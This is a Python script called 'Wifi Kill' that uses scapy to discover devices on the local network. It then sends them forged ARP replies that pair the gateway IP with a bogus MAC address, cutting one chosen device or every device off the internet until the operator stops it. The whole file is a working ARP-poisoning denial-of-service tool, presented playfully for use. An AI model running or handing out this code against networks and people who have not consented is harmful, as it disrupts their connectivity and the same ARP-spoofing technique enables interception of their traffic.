#!/usr/bin/env python

###############################################################################
#         Wifi Kill                                                           #
#        Robert Glew                                                          #
#                                                                             #
# This python script can be used to kick anyone or everyone off of your wifi  #
# network. The script must be run as sudo in order to send the required       #
# packets. Have fun.                                                          #
###############################################################################

import time
import os
from scapy.all import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def get_ip_macs(ips):
  # Returns a list of tupples containing the (ip, mac address)
  # of all of the computers on the network

  answers, uans = arping(ips, verbose=0)
  res = []
  for answer in answers:
    mac = answer[1].hwsrc
    ip  = answer[1].psrc
    res.append((ip, mac))
  return res

def poison(victim_ip, victim_mac, gateway_ip):
  # Send the victim an ARP packet pairing the gateway ip with the wrong
  # mac address
  packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
  send(packet, verbose=0)

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
  # Send the victim an ARP packet pairing the gateway ip with the correct
  # mac address
  packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
  send(packet, verbose=0)

def get_lan_ip():
  # A hacky method to get the current lan ip address. It requires internet
  # access, but it works
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect(("google.com", 80))
  ip = s.getsockname()
  s.close()
  return ip[0]

def printdiv():
  print '--------------------'

# Check for root
if os.geteuid() != 0:
  print "You need to run the script as a superuser"
  exit()

# Search for stuff every time we refresh
refreshing = True
gateway_mac = '12:34:56:78:9A:BC' # A default (bad) gateway mac address
while refreshing:
  # Use the current ip XXX.XXX.XXX.XXX and get a string in
  # the form "XXX.XXX.XXX.*" and "XXX.XXX.XXX.1". Right now,
  # the script assumes that the default gateway is "XXX.XXX.XXX.1"
  myip = get_lan_ip()
  ip_list = myip.split('.')
  del ip_list[-1]
  ip_list.append('*')
  ip_range = '.'.join(ip_list)
  del ip_list[-1]
  ip_list.append('1')
  gateway_ip = '.'.join(ip_list)

  # Get a list of devices and print them to the screen
  devices = get_ip_macs(ip_range)
  printdiv()
  print "Connected ips:"
  i = 0
  for device in devices:
    print '%s)\t%s\t%s' % (i, device[0], device[1])
    # See if we have the gateway MAC
    if device[0] == gateway_ip:
      gateway_mac = device[1]
    i+=1

  printdiv()
  print 'Gateway ip:  %s' % gateway_ip
  if gateway_mac != '12:34:56:78:9A:BC':
    print "Gateway mac: %s" % gateway_mac
  else:
    print 'Gateway not found. Script will be UNABLE TO RESTORE WIFI once shutdown is over'
  printdiv()
  
  # Get a choice and keep prompting until we get a valid letter or a number
  # that is in range
  print "Who do you want to boot?"
  print "(r - Refresh, a - Kill all, q - quit)"

  input_is_valid = False
  killall = False
  while not input_is_valid:
    choice = raw_input(">")
    if choice.isdigit():
      # If we have a number, see if it's in the range of choices
      if int(choice) < len(devices) and int(choice) >= 0:
        refreshing = False
        input_is_valid = True
    elif choice is 'a':
      # If we have an a, set the flag to kill everything
      killall = True
      input_is_valid = True
      refreshing = False
    elif choice is 'r':
      # If we have an r, say we have a valid input but let everything
      # refresh again
      input_is_valid = True
    elif choice is 'q':
      # If we have a q, just quit. No cleanup required
      exit()
    
    if not input_is_valid:
      print 'Please enter a valid choice'

# Once we have a valid choice, we decide what we're going to do with it
if choice.isdigit():
  # If we have a number, loop the poison function until we get a
  # keyboard inturrupt (ctl-c)
  choice = int(choice)
  victim = devices[choice]
  print "Preventing %s from accessing the internet..." % victim[0]
  try:
    while True:
      poison(victim[0], victim[1], gateway_ip)
  except KeyboardInterrupt:
      restore(victim[0], victim[1], gateway_ip, gateway_mac)
      print '\nYou\'re welcome!'
elif killall:
  # If we are going to kill everything, loop the poison function until we
  # we get a keyboard inturrupt (ctl-c)
  try:
    while True:
      for victim in devices:
        poison(victim[0], victim[1], gateway_ip)
  except KeyboardInterrupt:
    for victim in devices:
      restore(victim[0], victim[1], gateway_ip, gateway_mac)
    print '\nYou\'re welcome!'
    
